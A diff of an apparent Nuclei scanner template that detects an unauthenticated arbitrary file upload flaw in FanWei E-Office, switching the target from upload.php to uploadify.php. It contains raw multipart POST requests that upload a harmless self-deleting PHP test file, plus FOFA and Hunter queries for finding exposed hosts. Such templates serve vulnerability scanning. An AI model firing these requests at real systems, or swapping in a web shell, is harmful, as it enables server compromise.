@@ -1,52 +1,39 @@
 id: FanWei
 
 info:
-  name: FanWei Micro OA E-Office upload.php Arbitrary File Upload Vulnerability
+  name: FanWei Micro OA E-Office Uploadify Arbitrary File Upload Vulnerability
   author: Zero Trust Security Attack and Defense Laboratory
   severity: high
   description: |
-    FanWei E-Office uploads files in upload.php without strict filtering, which allows unrestricted file uploading. Attackers can directly obtain website permissions through this vulnerability
+    The pan micro OA E-Office uploads files in uploadify.php without strict filtering, which allows unrestricted file uploading. Attackers can directly obtain website permissions through this vulnerability
   metadata:
     fofa-query: app="泛微-EOffice"
     hunter-query: web.title="泛微软件"
 
-
-variables:
-  str1: '{{rand_base(6)}}'
-  str2: '{{rand_base(6)}}'
-
 http:
   - raw:
       - |
-        POST /webservice/upload.php HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
-        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryakbyiukl
-        Accept-Encoding: gzip
-        Connection: close
+          POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+          Connection: close
+          Content-Length: 259
+          Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+          Accept-Encoding: gzip
 
-        ------WebKitFormBoundaryakbyiukl
-        Content-Disposition: form-data; name="file"; filename="a.php4"
-        Content-Type: application/octet-stream
+          --e64bdf16c554bbc109cecef6451c26a4
+          Content-Disposition: form-data; name="Filedata"; filename="test.php"
+          Content-Type: image/jpeg
 
-        <?php echo "{{str2}}";?>
-        ------WebKitFormBoundaryakbyiukl--
+          <?php echo "test";unlink(__FILE__);?>
 
-      - |
-        GET /attachment/{{replace(name,"*","/")}}.php4 HTTP/1.1
-        Host: {{Hostname}}
+          --e64bdf16c554bbc109cecef6451c26a4--
 
-    extractors:
-      - type: regex
-        name: name
-        group: 1
-        regex:
-          - '([/*0-9a-zA-Z]+)\.php4$'
-        internal: true
-
+    req-condition: true
     matchers:
       - type: dsl
         dsl:
-          - body_2 == str2
-
-# http://your-ip/attachment/回显的那串数字/a.php4
+          - 'status_code_1 == 200 && len(body) > 0'
+        condition: and
+  
+# /attachment/3466744850/xxx.php
